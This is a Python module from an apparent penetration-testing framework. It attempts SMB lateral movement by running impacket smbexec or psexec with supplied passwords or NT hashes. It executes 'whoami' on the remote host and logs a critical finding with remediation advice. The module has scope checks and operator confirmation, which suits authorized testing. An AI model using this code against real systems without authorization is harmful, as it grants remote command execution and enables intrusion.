"""SMB execution — lateral movement via impacket psexec/smbexec."""
from __future__ import annotations

import asyncio
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_LATERAL = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H"
CVSS40_LATERAL = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
class SmbExec(BaseModule):
    """SMB-based lateral movement via psexec/smbexec."""

    NAME        = "smb_exec"
    DESCRIPTION = "Attempt SMB lateral movement (psexec/smbexec) with provided credentials"
    PHASE       = 10
    TAGS        = ["lateral", "smb", "psexec", "smbexec", "mitre-T1021.002"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        domain = self.config.extra.get("domain", "")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        username = self.config.extra.get("username", "")
        password = self.config.extra.get("password", "")
        nt_hash  = self.config.extra.get("hash", "")

        if not (username and (password or nt_hash)):
            return self._make_result(start, skipped=True, skip_reason="no credentials")

        confirmed = self.confirm_action(
            module=self.NAME,
            action=(
                f"Attempt SMB lateral movement to {target} "
                f"as {domain}\\{username} (psexec/smbexec)"
            ),
            target=target,
            risk=(
                "Creates service or named pipe on target. "
                "ACTIVE EXPLOITATION — will create artifacts on target. "
                "Only in authorized full-compromise scope."
            ),
        )
        if not confirmed:
            return self._make_result(start, skipped=True, skip_reason="operator declined")

        await self._try_smbexec(target, domain, username, password, nt_hash)
        return self._make_result(start)

    async def _try_smbexec(
        self, host: str, domain: str, username: str, password: str, nt_hash: str
    ) -> None:
        import shutil

        # Prefer smbexec (less noisy than psexec)
        for script_name in ["smbexec.py", "impacket-smbexec", "psexec.py", "impacket-psexec"]:
            script = shutil.which(script_name)
            if not script:
                continue

            cmd = [script]
            if nt_hash:
                cmd += ["-hashes", f":{nt_hash}"]
            cmd += [f"{domain}/{username}:{password}@{host}" if not nt_hash
                    else f"{domain}/{username}@{host}"]

            try:
                proc = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdin=asyncio.subprocess.PIPE,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                # Send whoami command then exit
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(input=b"whoami\nexit\n"), timeout=30
                )
                output = stdout.decode() + stderr.decode()

                if any(kw in output.lower() for kw in
                       ["system32", "nt authority", "windows", "\\"]):
                    ev = Evidence(
                        response_raw=output[:300],
                        extra={
                            "host":    host,
                            "method":  script_name,
                            "user":    f"{domain}\\{username}",
                        }
                    )
                    self.new_finding(
                        title=f"Lateral Movement Successful — {script_name} to {host}",
                        severity=Severity.CRITICAL,
                        description=(
                            f"SMB lateral movement via {script_name} to {host} succeeded "
                            f"as {domain}\\{username}. "
                            f"Command output: {output[:100]}"
                        ),
                        reproduction_steps=[
                            f"{script_name} {domain}/{username}@{host}",
                            "whoami  # executed on remote host",
                        ],
                        remediation=(
                            "Enable SMB signing. "
                            "Restrict admin shares (ADMIN$, IPC$). "
                            "Implement tiered admin — DA creds should never be on workstations."
                        ),
                        references=["MITRE T1021.002"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_LATERAL,
                        cvss_v40_vector=CVSS40_LATERAL,
                        mitre_attack=["TA0008/T1021.002"],
                        target=host,
                        port=445,
                        service="smb",
                        operator_confirmed=True,
                    )
                return  # Done with this host
            except Exception as exc:
                self.log.debug("%s failed on %s: %s", script_name, host, exc)


class TestSmbExec:
    def test_cvss_vector(self) -> None:
        assert CVSS_LATERAL.startswith("CVSS:3.1")
